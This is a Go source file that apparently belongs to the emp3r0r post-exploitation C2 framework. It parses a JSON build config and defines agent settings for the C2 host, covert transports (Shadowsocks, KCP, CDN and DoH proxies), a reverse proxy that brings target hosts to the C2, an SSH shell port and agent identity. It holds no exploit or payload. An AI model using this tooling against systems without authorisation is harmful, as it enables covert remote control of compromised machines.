package emp3r0r_def

import (
	"encoding/json"
	"fmt"
	"log"
	"strconv"
)

// ReadJSONConfig read runtime variables from JSON, and apply them
func ReadJSONConfig(jsonData []byte, config_to_write *Config) (err error) {
	// parse the json
	err = json.Unmarshal(jsonData, config_to_write)
	if err != nil {
		return fmt.Errorf("failed to parse JSON config: %v", err)
	}
	calculateReverseProxyPort := func() string {
		p, err := strconv.Atoi(config_to_write.Emp3r0rProxyServerPort)
		if err != nil {
			log.Printf("WTF? Emp3r0rProxyPort %s: %v. Invalid JSON config, perhaps start over with a new config file?", config_to_write.Emp3r0rProxyServerPort, err)
			return "22222"
		}

		// reverseProxyPort
		rProxyPortInt := p + 1
		return strconv.Itoa(rProxyPortInt)
	}
	config_to_write.ReverseProxyPort = calculateReverseProxyPort()

	// these variables are decided by other variables
	CCAddress = fmt.Sprintf("https://%s", config_to_write.CCHost)
	DefaultShell = config_to_write.UtilsPath + "/bash"
	AESKey = GenAESKey("Your Pre Shared AES Key: " + MagicString)

	return
}

// Config build.json config file
type Config struct {
	CCPort                    string `json:"cc_port"`                      // CC service port, TLS enabled
	Emp3r0rProxyServerPort    string `json:"emp3r0r_proxy_port"`           // Socks5 proxy server port
	AutoProxyTimeout          int    `json:"autoproxy_timeout"`            // timeout (in seconds) for agent side Socks5 server
	StagerHTTPListenerPort    string `json:"http_listner_port"`            // For stager HTTP server
	Password                  string `json:"password"`                     // password of shadowsocks, socks5 and SSH server
	ShadowsocksLocalSocksPort string `json:"shadowsocks_local_socks_port"` // socks5 port of shadowsocks
	ShadowsocksServerPort     string `json:"shadowsocks_server_port"`      // server port of shadowsocks proxy server, can run on CC and agent
	KCPServerPort             string `json:"kcp_server_port"`              // server port of kcp server
	KCPClientPort             string `json:"kcp_client_port"`              // client port of kcp
	UseShadowsocks            bool   `json:"use_shadowsocks"`              // enable shadowsocks proxy server for C2 transport
	UseKCP                    bool   `json:"use_kcp"`                      // enable KCP for Shadowsocks C2 transport
	DisableNCSI               bool   `json:"disable_ncsi"`                 // disable NCSI connectivity checking, useful when C2 is reachable but NCSI is not
	SSHHostKey                []byte `json:"ssh_host_key"`                 // SSH host (private) key (PEM string), used by remote forwarding server
	ReverseProxyPort          string `json:"reverse_proxy_port"`           // Used to bring target host to C2, see Bring2CC
	SSHDShellPort             string `json:"sshd_shell_port"`              // interactive shell
	BroadcastPort             string `json:"broadcast_port"`               // UDP port used for broadcasting msg
	BroadcastIntervalMin      int    `json:"broadcast_interval_min"`       // seconds, set max to 0 to disable
	BroadcastIntervalMax      int    `json:"broadcast_interval_max"`       // seconds, set max to 0 to disable
	CCHost                    string `json:"cc_host"`                      // Address of C2 server
	PIDFile                   string `json:"pid_file"`                     // PID of agent process
	CCIndicator               string `json:"cc_indicator"`                 // URL of CC indicator
	IndicatorWaitMin          int    `json:"indicator_wait_min"`           // seconds
	IndicatorWaitMax          int    `json:"indicator_wait_max"`           // seconds, set max to 0 to disable
	CCIndicatorText           string `json:"indicator_text"`               // what to send in response when indicator URL is requested
	CAPEM                     string `json:"ca"`                           // CA cert from server side
	CAFingerprint             string `json:"ca_fingerprint"`               // CA cert fingerprint
	C2TransportProxy          string `json:"c2transport_proxy"`            // proxy for C2 transport
	CDNProxy                  string `json:"cdn_proxy"`                    // websocket proxy, see go-cdn2proxy
	DoHServer                 string `json:"doh_server"`                   // DNS over HTTPS server, for name resolving
	SocketName                string `json:"socket"`                       // agent socket, use this to check agent status
	AgentRoot                 string `json:"agent_root"`                   // Where to store agent runtime files, default to /tmp
	UtilsPath                 string `json:"utils_path"`                   // where to store `vaccine` files
	AgentUUID                 string `json:"agent_uuid"`                   // UUID of agent, used to verify agent
	AgentUUIDSig              string `json:"agent_uuid_sig"`               // UUID of agent signed by CA
	AgentTag                  string `json:"agent_tag"`                    // generated from UUID, will be used to identidy agents
	Timeout                   int    `json:"timeout"`                      // wait until this amount of milliseconds to re-connect to C2
}